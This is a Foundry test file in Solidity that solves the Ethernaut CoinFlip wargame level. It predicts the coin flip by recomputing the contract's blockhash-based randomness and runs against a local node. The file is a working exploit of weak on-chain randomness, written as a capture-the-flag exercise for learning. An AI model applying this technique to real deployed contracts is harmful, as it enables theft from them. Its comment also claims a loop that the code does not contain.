// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/03_CoinFlip.sol";

/*
Author: @BoscoHuang

Attack Process:
As you see, the solution is pretty straightforward. Loop until the

`consecutiveWins()` getter tell us we have reached `10`.

Inside the loop we calculate the value to pass to `flip` replicating the same logic of the `CoinFlip.flip` function.

Command:
- forge test --match-contract CoinFlipTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract CoinFlipTest is DSTest {
    CoinFlip Ethernaut03;

    function setUp() public {
        Ethernaut03 = CoinFlip(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // CoinFlip address in anvil
    }

    function testEthernaut03() public {
        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 blockValue = uint256(blockhash(block.number - 1));
        
        uint256 coinFlip = blockValue / FACTOR;
            
        bool side = coinFlip == 1 ? true : false;

        Ethernaut03.flip(side);

        console.log("Consecutive Wins: ", Ethernaut03.consecutiveWins());

    }
}

